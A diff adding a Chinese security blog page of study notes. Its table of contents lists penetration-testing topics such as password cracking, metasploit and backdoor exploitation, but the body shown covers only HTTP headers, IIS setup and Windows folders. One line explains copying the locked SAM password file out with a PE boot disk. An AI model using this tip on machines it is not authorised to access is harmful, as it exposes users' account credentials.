@@ -1,0 +1,610 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>web学习笔记 | z3lce学习记录</title><meta name="description" content="菜鸡学web"><meta name="keywords" content="basic"><meta name="author" content="z3lce"><meta name="copyright" content="z3lce"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://www.infore.top/2020/07/20/web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="360-site-verification" content="{&quot;theme_color&quot;:{&quot;enable&quot;:true,&quot;main&quot;:&quot;#49B1F5&quot;,&quot;paginator&quot;:&quot;#00c4b6&quot;,&quot;button_hover&quot;:&quot;#FF7242&quot;,&quot;text_selection&quot;:&quot;#00c4b6&quot;,&quot;link_color&quot;:&quot;#99a9bf&quot;,&quot;meta_color&quot;:&quot;#858585&quot;,&quot;hr_color&quot;:&quot;#A4D8FA&quot;,&quot;code_foreground&quot;:&quot;#F47466&quot;,&quot;code_background&quot;:&quot;rgba(27, 31, 35, .05)&quot;,&quot;toc_color&quot;:&quot;#00c4b6&quot;,&quot;blockquote_padding_color&quot;:&quot;#49b1f5&quot;,&quot;blockquote_background_color&quot;:&quot;#49b1f5&quot;}}"/><meta property="og:type" content="article"><meta property="og:title" content="web学习笔记"><meta property="og:url" content="http://www.infore.top/2020/07/20/web%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><meta property="og:site_name" content="z3lce学习记录"><meta property="og:description" content="菜鸡学web"><meta property="og:image" content="https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/20200719093024.png"><meta property="article:published_time" content="2020-07-20T10:01:55.000Z"><meta property="article:modified_time" content="2020-07-20T10:01:55.000Z"><meta name="twitter:card" content="summary"><script>var activateDarkMode = function () {
+  document.documentElement.setAttribute('data-theme', 'dark')
+  if (document.querySelector('meta[name="theme-color"]') !== null) {
+    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#000')
+  }
+}
+var activateLightMode = function () {
+  document.documentElement.setAttribute('data-theme', 'light')
+  if (document.querySelector('meta[name="theme-color"]') !== null) {
+    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#fff')
+  }
+}
+
+var getCookies = function (name) {
+  const value = `; ${document.cookie}`
+  const parts = value.split(`; ${name}=`)
+  if (parts.length === 2) return parts.pop().split(';').shift()
+}
+
+var autoChangeMode = 'false'
+var t = getCookies('theme')
+if (autoChangeMode === '1') {
+  var isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+  var isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+  var isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+  if (t === undefined) {
+    if (isLightMode) activateLightMode()
+    else if (isDarkMode) activateDarkMode()
+    else if (isNotSpecified || hasNoSupport) {
+      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
+      var now = new Date()
+      var hour = now.getHours()
+      var isNight = hour <= 6 || hour >= 18
+      isNight ? activateDarkMode() : activateLightMode()
+    }
+    window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+      if (Cookies.get('theme') === undefined) {
+        e.matches ? activateDarkMode() : activateLightMode()
+      }
+    })
+  } else if (t === 'light') activateLightMode()
+  else activateDarkMode()
+} else if (autoChangeMode === '2') {
+  now = new Date()
+  hour = now.getHours()
+  isNight = hour <= 6 || hour >= 18
+  if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+  else if (t === 'light') activateLightMode()
+  else activateDarkMode()
+} else {
+  if (t === 'dark') activateDarkMode()
+  else if (t === 'light') activateLightMode()
+}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><link rel="prev" title="逆向基础知识" href="http://www.infore.top/2020/07/27/%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"><link rel="next" title="pwn" href="http://www.infore.top/2020/07/15/pwn/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  bookmark: {
+    message_prev: '按',
+    message_next: '键将本页加入书签'
+  },
+  runtime_unit: '天',
+  runtime: true,
+  copyright: {"languages":{"author":"作者: z3lce","link":"链接: ","source":"来源: z3lce学习记录","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  ClickShowText: undefined,
+  medium_zoom: false,
+  fancybox: true,
+  Snackbar: {"bookmark":{"message_prev":"按","message_next":"键将本页加入书签"},"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  baiduPush: false,
+  highlightCopy: true,
+  highlightLang: true,
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isanchor: false    
+}</script><script>var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isSidebar: true
+  }</script><noscript><style>
+#nav {
+  opacity: 1
+}
+.justified-gallery img{
+  opacity: 1
+}
+</style></noscript><link rel="stylesheet" href="/css/background.css"><meta name="generator" content="Hexo 4.2.1"></head><body><script type="text/javascript" src="/js/crash_cheat.js"></script><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><canvas class="fireworks"></canvas><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/img/avatar.gif" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">14</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">12</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">10</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#http头部"><span class="toc-number">1.</span> <span class="toc-text"> Http头部</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#响应码"><span class="toc-number">1.1.</span> <span class="toc-text"> 响应码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#via"><span class="toc-number">1.1.1.</span> <span class="toc-text"> Via</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#user-agent"><span class="toc-number">1.1.2.</span> <span class="toc-text"> User-Agent</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#referer"><span class="toc-number">1.1.3.</span> <span class="toc-text"> Referer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#proxy-authenticate"><span class="toc-number">1.1.4.</span> <span class="toc-text"> Proxy-Authenticate</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#proxy-authorization"><span class="toc-number">1.1.5.</span> <span class="toc-text"> Proxy-Authorization</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#content-encoding"><span class="toc-number">1.1.6.</span> <span class="toc-text"> Content-Encoding</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#content-language"><span class="toc-number">1.1.7.</span> <span class="toc-text"> Content-Language</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#content-length"><span class="toc-number">1.1.8.</span> <span class="toc-text"> Content-Length</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#content-range"><span class="toc-number">1.1.9.</span> <span class="toc-text"> Content-Range</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#content-type"><span class="toc-number">1.1.10.</span> <span class="toc-text"> Content-Type</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#搭建网站"><span class="toc-number">2.</span> <span class="toc-text"> 搭建网站</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#iis-60搭建aspsqlserver网站环境"><span class="toc-number">2.1.</span> <span class="toc-text"> IIS 6.0搭建ASP+SqlServer网站环境</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#windows"><span class="toc-number">3.</span> <span class="toc-text"> Windows</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#windows-文件结构"><span class="toc-number">3.1.</span> <span class="toc-text"> Windows 文件结构</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#windowssystem32configsam"><span class="toc-number">3.1.1.</span> <span class="toc-text"> Windows&#x2F;system32&#x2F;config&#x2F;SAM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windowssystem32driversetchosts"><span class="toc-number">3.1.2.</span> <span class="toc-text"> Windows&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;hosts</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#window服务"><span class="toc-number">3.2.</span> <span class="toc-text"> Window服务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#服务的管理"><span class="toc-number">3.2.1.</span> <span class="toc-text"> 服务的管理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#编写服务程序的语言"><span class="toc-number">3.2.2.</span> <span class="toc-text"> 编写服务程序的语言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#服务的启动类型"><span class="toc-number">3.2.3.</span> <span class="toc-text"> 服务的启动类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三种登录方式"><span class="toc-number">3.2.4.</span> <span class="toc-text"> 三种登录方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#net"><span class="toc-number">3.2.5.</span> <span class="toc-text"> net</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sc"><span class="toc-number">3.2.6.</span> <span class="toc-text"> sc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wmic-service-get列出所有服务"><span class="toc-number">3.2.7.</span> <span class="toc-text"> wmic service get–&gt;列出所有服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#findstr"><span class="toc-number">3.2.8.</span> <span class="toc-text"> findstr</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows端口"><span class="toc-number">3.3.</span> <span class="toc-text"> Windows端口</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#http协议代理服务器常用端口号"><span class="toc-number">3.3.1.</span> <span class="toc-text"> http协议代理服务器常用端口号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#端口0服务reserved"><span class="toc-number">3.3.2.</span> <span class="toc-text"> 端口：0服务：Reserved</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#端口1服务tcpmux"><span class="toc-number">3.3.3.</span> <span class="toc-text"> 端口：1服务：tcpmux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#端口7服务echo"><span class="toc-number">3.3.4.</span> <span class="toc-text"> 端口：7服务：Echo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#端口19服务character-generator"><span class="toc-number">3.3.5.</span> <span class="toc-text"> 端口：19服务：Character Generator</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#端口21服务ftp"><span class="toc-number">3.3.6.</span> <span class="toc-text"> 端口：21服务：FTP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#端口22服务ssh"><span class="toc-number">3.3.7.</span> <span class="toc-text"> 端口：22服务：ssh</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#端口23服务telnet"><span class="toc-number">3.3.8.</span> <span class="toc-text"> 端口：23服务：Telnet</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其他端口"><span class="toc-number">3.3.9.</span> <span class="toc-text"> 其他端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#端口25服务smtp"><span class="toc-number">3.3.10.</span> <span class="toc-text"> 端口：25服务：SMTP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#端口69服务trival-file-transfer"><span class="toc-number">3.3.11.</span> <span class="toc-text"> 端口：69服务：Trival File Transfer</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows常用注册表"><span class="toc-number">3.4.</span> <span class="toc-text"> Windows常用注册表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常用dos命令"><span class="toc-number">3.5.</span> <span class="toc-text"> 常用Dos命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows操作系统快捷键"><span class="toc-number">3.6.</span> <span class="toc-text"> windows操作系统快捷键</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows登录密码破解"><span class="toc-number">3.7.</span> <span class="toc-text"> Windows登录密码破解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#u盘破解"><span class="toc-number">3.7.1.</span> <span class="toc-text"> u盘破解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用工具破解"><span class="toc-number">3.7.2.</span> <span class="toc-text"> 使用工具破解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#lc5"><span class="toc-number">3.7.2.1.</span> <span class="toc-text"> lc5</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#彩虹表"><span class="toc-number">3.7.2.2.</span> <span class="toc-text"> 彩虹表</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#木马查找"><span class="toc-number">3.8.</span> <span class="toc-text"> 木马查找</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#linux"><span class="toc-number">4.</span> <span class="toc-text"> Linux</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#dns服务器"><span class="toc-number">5.</span> <span class="toc-text"> DNS服务器</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#badusb"><span class="toc-number">6.</span> <span class="toc-text"> BADUSB</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#虚拟机"><span class="toc-number">7.</span> <span class="toc-text"> 虚拟机</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh"><span class="toc-number">7.1.</span> <span class="toc-text"> ssh</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#主机探测"><span class="toc-number">8.</span> <span class="toc-text"> 主机探测</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#二层发现数据链路层"><span class="toc-number">8.1.</span> <span class="toc-text"> 二层发现（数据链路层）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#arping"><span class="toc-number">8.1.1.</span> <span class="toc-text"> arping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#netdiscover"><span class="toc-number">8.1.2.</span> <span class="toc-text"> netdiscover</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#三层发现网络层"><span class="toc-number">8.2.</span> <span class="toc-text"> 三层发现（网络层）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ping"><span class="toc-number">8.2.1.</span> <span class="toc-text"> ping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fping"><span class="toc-number">8.2.2.</span> <span class="toc-text"> fping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hping3"><span class="toc-number">8.2.3.</span> <span class="toc-text"> hping3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#四层发现传输层"><span class="toc-number">8.3.</span> <span class="toc-text"> 四层发现（传输层）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap"><span class="toc-number">8.3.1.</span> <span class="toc-text"> nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hping3-2"><span class="toc-number">8.3.2.</span> <span class="toc-text"> hping3</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#端口扫描"><span class="toc-number">9.</span> <span class="toc-text"> 端口扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap-2"><span class="toc-number">9.1.</span> <span class="toc-text"> nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dmitry"><span class="toc-number">9.2.</span> <span class="toc-text"> dmitry</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#netcat"><span class="toc-number">9.3.</span> <span class="toc-text"> netcat</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞扫描"><span class="toc-number">10.</span> <span class="toc-text"> 漏洞扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap-3"><span class="toc-number">10.1.</span> <span class="toc-text"> nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nessus"><span class="toc-number">10.2.</span> <span class="toc-text"> nessus</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#metasploit-漏洞利用"><span class="toc-number">10.3.</span> <span class="toc-text"> metasploit 漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web漏洞扫描"><span class="toc-number">10.4.</span> <span class="toc-text"> web漏洞扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nikto"><span class="toc-number">10.4.1.</span> <span class="toc-text"> nikto</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlmap"><span class="toc-number">10.4.2.</span> <span class="toc-text"> sqlmap</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web神器"><span class="toc-number">10.5.</span> <span class="toc-text"> web神器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#burpsuite"><span class="toc-number">10.5.1.</span> <span class="toc-text"> burpsuite</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#证书安装"><span class="toc-number">10.5.1.1.</span> <span class="toc-text"> 证书安装</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#截断设置"><span class="toc-number">10.5.1.2.</span> <span class="toc-text"> 截断设置</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞利用"><span class="toc-number">11.</span> <span class="toc-text"> 漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ftp"><span class="toc-number">11.1.</span> <span class="toc-text"> ftp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh-2"><span class="toc-number">11.2.</span> <span class="toc-text"> SSH</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#telnet"><span class="toc-number">11.3.</span> <span class="toc-text"> telnet</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#smtp"><span class="toc-number">11.4.</span> <span class="toc-text"> smtp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nfs"><span class="toc-number">11.5.</span> <span class="toc-text"> NFS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#smb"><span class="toc-number">11.6.</span> <span class="toc-text"> SMB</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rlogin"><span class="toc-number">11.7.</span> <span class="toc-text"> rlogin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反序列化远程命令执行漏洞"><span class="toc-number">11.8.</span> <span class="toc-text"> 反序列化远程命令执行漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后门连接"><span class="toc-number">11.9.</span> <span class="toc-text"> 后门连接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nfs获取目标密码文件"><span class="toc-number">11.10.</span> <span class="toc-text"> nfs获取目标密码文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#proftpd测试"><span class="toc-number">11.11.</span> <span class="toc-text"> proftpd测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql弱口令破解"><span class="toc-number">11.12.</span> <span class="toc-text"> mysql弱口令破解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#postgresql数据库利用"><span class="toc-number">11.13.</span> <span class="toc-text"> postgresql数据库利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#vnc密码破解"><span class="toc-number">11.14.</span> <span class="toc-text"> vnc密码破解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#irc后门利用"><span class="toc-number">11.15.</span> <span class="toc-text"> IRC后门利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tomcat密码破解"><span class="toc-number">11.16.</span> <span class="toc-text"> tomcat密码破解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#杂项笔记"><span class="toc-number">11.17.</span> <span class="toc-text"> 杂项笔记</span></a></li></ol></li></ol></div></div></div><div id="body-wrap"><div id="web_bg" data-type="color"></div><header class="post-bg" id="page-header" style="background-image: url(https://pdc246871-1302651496.cos.ap-nanjing.myqcloud.com/20200719093024.png)"><nav id="nav"><span class="pull-left" id="blog_name"><a class="blog_title" id="site-name" href="/">z3lce学习记录</a></span><span class="pull-right menus"><div id="search_button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><span class="toggle-menu close"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">web学习笔记</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="发表于 2020-07-20 18:01:55"><i class="far fa-calendar-alt fa-fw"></i> 发表于 2020-07-20</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="更新于 2020-07-20 18:01:55"><i class="fas fa-history fa-fw"></i> 更新于 2020-07-20</span></time><span class="post-meta__categories"><span class="post-meta__separator">|</span><i class="fas fa-inbox fa-fw post-meta__icon"></i><a class="post-meta__categories" href="/categories/web/">web</a></span></div><div class="meta-secondline"> <span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta__icon"></i><span>字数总计:</span><span class="word-count">8k</span><span class="post-meta__separator">|</span><i class="far fa-clock fa-fw post-meta__icon"></i><span>阅读时长: 28 分钟</span></span></div><div class="meta-thirdline"><span class="post-meta-pv-cv"><span class="post-meta__separator">|</span><i class="far fa-eye fa-fw post-meta__icon"></i><span>阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-commentcount"></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="http头部"><a class="markdownIt-Anchor" href="#http头部"></a> Http头部</h1>
+<h2 id="响应码"><a class="markdownIt-Anchor" href="#响应码"></a> 响应码</h2>
+<p>1xx：信息，请求收到，继续处理</p>
+<p>2xx：成功，行为被成功地接受、理解和采纳</p>
+<p>3xx：重定向，为了完成请求，必须进一步执行的动作</p>
+<p>4xx：客户端错误，请求包含语法错误或者请求无法实现</p>
+<p>5xx：服务器错误，服务器不能实现一种明显无效的请求</p>
+<h3 id="via"><a class="markdownIt-Anchor" href="#via"></a> Via</h3>
+<p>列出从客户端到 OCS 或者相反方向的响应经过了哪些代理服务器，他们用什么协议（和版本）发送的请求</p>
+<h3 id="user-agent"><a class="markdownIt-Anchor" href="#user-agent"></a> User-Agent</h3>
+<p>浏览器表明自己的身份（是哪种浏览器）。例如：User-Agent：Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN;<br />
+rv:1.8.1.14) Gecko/20080404 Firefox/2.0.0.14</p>
+<h3 id="referer"><a class="markdownIt-Anchor" href="#referer"></a> Referer</h3>
+<p>浏览器向 WEB 服务器表明自己是从哪个 网页/URL 获得/点击 当前请求中的网址/URL。<br />
+例如：Referer：<a href="http://www.sina.com/" target="_blank" rel="noopener">http://www.sina.com/</a></p>
+<h3 id="proxy-authenticate"><a class="markdownIt-Anchor" href="#proxy-authenticate"></a> Proxy-Authenticate</h3>
+<p>代理服务器响应浏览器，要求其提供代理身份验证信息。</p>
+<h3 id="proxy-authorization"><a class="markdownIt-Anchor" href="#proxy-authorization"></a> Proxy-Authorization</h3>
+<p>浏览器响应代理服务器的身份验证请求，提供自己的身份信息。</p>
+<h3 id="content-encoding"><a class="markdownIt-Anchor" href="#content-encoding"></a> Content-Encoding</h3>
+<p>WEB服务器表明自己使用了什么压缩方法（gzip，deflate）压缩响应中的对象。<br />
+例如：Content-Encoding：gzip</p>
+<h3 id="content-language"><a class="markdownIt-Anchor" href="#content-language"></a> Content-Language</h3>
+<p>WEB 服务器告诉浏览器自己响应的对象的语言。</p>
+<h3 id="content-length"><a class="markdownIt-Anchor" href="#content-length"></a> Content-Length</h3>
+<p>WEB 服务器告诉浏览器自己响应的对象的长度。例如：Content-Length: 26012</p>
+<h3 id="content-range"><a class="markdownIt-Anchor" href="#content-range"></a> Content-Range</h3>
+<p>WEB 服务器表明该响应包含的部分对象为整个对象的哪个部分。<br />
+例如：Content-Range: bytes 21010-47021/47022</p>
+<h3 id="content-type"><a class="markdownIt-Anchor" href="#content-type"></a> Content-Type</h3>
+<p>WEB 服务器告诉浏览器自己响应的对象的类型。<br />
+例如：Content-Type：application/xml</p>
+<h1 id="搭建网站"><a class="markdownIt-Anchor" href="#搭建网站"></a> 搭建网站</h1>
+<h2 id="iis-60搭建aspsqlserver网站环境"><a class="markdownIt-Anchor" href="#iis-60搭建aspsqlserver网站环境"></a> IIS 6.0搭建ASP+SqlServer网站环境</h2>
+<p>可以在虚拟机上安装window server服务器 也可以在 实体机上开启IIS 服务；sqlserver 就直接安装 和 安装manage ；之后设置好服务器的conn 的连接设置；注意要将wwwroot 目录下的 inc 文件夹设置给Internet来宾访问权限</p>
+<p>1、同IP 不同端口 不配置主机头</p>
+<p>2、不同ip地址，同端口</p>
+<p>3、同ip 同端口 不同的主机头</p>
+<h1 id="windows"><a class="markdownIt-Anchor" href="#windows"></a> Windows</h1>
+<h2 id="windows-文件结构"><a class="markdownIt-Anchor" href="#windows-文件结构"></a> Windows 文件结构</h2>
+<h3 id="windowssystem32configsam"><a class="markdownIt-Anchor" href="#windowssystem32configsam"></a> Windows/system32/config/SAM</h3>
+<p>此目录下 的SAM是保存账号密码的，开机即加锁</p>
+<p>解决方法：使用PE将其copy出来</p>
+<p>●Windows:存放操作系统主要文件，非常重要。Temp:存放系统或其他软件临时文件， PerfLogs: Windows Vista或Windows 系统日志，记录如磁盘扫描错误等信息，没有必要删除。●Drivers: 部分驱动程序的文件夹。Favorites:收藏夹。●Program Files: 应用程序文件夹，一 般软件默认都安装在这里，也有一些系统自带的应用程序。在Windows 系统中，64位用户会多出一-个ProgramFiles (X86) 文件夹，这是系统中32位软件的安装目录。</p>
